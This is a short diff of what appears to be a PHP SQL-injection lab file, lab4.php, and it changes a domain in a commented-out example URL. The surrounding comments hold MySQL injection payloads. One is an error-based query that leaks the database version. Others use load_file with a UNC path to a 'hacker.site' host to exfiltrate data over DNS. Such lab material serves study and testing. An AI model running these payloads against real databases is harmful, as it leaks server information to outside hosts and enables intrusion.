@@ -21,7 +21,7 @@ if (isset($_POST['sql'])) {
 }
 
 $dt = '{ "a": 1, "b": [2, 3]}';
-//https://master.kotnova.com/lab4.php?local=1&sql=/usr/local/bin/home/php/tsavosit/kever/data.txt
+//https://kever.io/lab4.php?local=1&sql=/usr/local/bin/home/php/tsavosit/kever/data.txt
 //$stmt = $conn->prepare("(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))");
 //$stmt = $conn->prepare("SELECT load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));");
 ///$stmt = $conn->prepare("SELECT concat('\\\\',version(),'.hacker.site\\a.txt')");
